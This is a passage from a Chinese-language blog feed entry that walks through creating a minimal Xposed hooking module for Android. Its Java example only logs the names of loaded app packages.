class="line">            <span class="tag">&lt;/<span class="title">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="title">activity</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposedmodule"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"true"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposeddescription"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"Xposed Example"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposedminversion"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"54"</span> /&gt;</span> //和XposedBridgeApi-54.jar版本对应</span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="title">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>5.编写插件代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.idhyt.xposedexample;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XposedExample</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(<span class="keyword">final</span> LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        XposedBridge.log(<span class="string">"Loaded app: "</span> + lpparam.packageName);</span><br><span class="line">        XposedBridge.log(<span class="string">"this is a test by idhyt"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>6.在assets文件夹(如果不存在就创建)下新建file写入插件启动入口:<br><code>com.idhyt.xposedexample.XposedExample</code></p>
<p>整个工程目录如下所示:<br><img src="http://o9xrwsn0z.bkt.clouddn.com/android-xposed-3e.jpg" alt="project-dir"></p>
<p>7.运行之后 会在虚拟机中看到我们的插件已经安装到xposed模块里边，然后勾选重启系统。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/android-xposed-4.jpg" alt="install-ok"></p>
<p>8.重启过后，加入过滤规则“loaded app”，在logcat窗口会看到我们的输出日志信息，你打开应用也会显示加载的应用包名。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/android-xposed-5.jpg" alt="logcat-out"></p>
<h3 id="xposed用法详解">xposed用法详解</h3><p>移步：<a href="http://blog.idhyt.com/2015/11/28/android-injection-xposed-usage/">安卓注入框架Xposed用法详解</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="概述">概述</h3><p>Xposed是针对Android平台的动态劫持项目，源码<a href="https://github.com/rovo89" target="_blank" rel="external">github</a></p>
<h4 id="]]>
    </summary>
    
      <category term="xposed" scheme="http://blog.idhyt.com/tags/xposed/"/>
    
      <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
    
  </entry>
  
</feed>
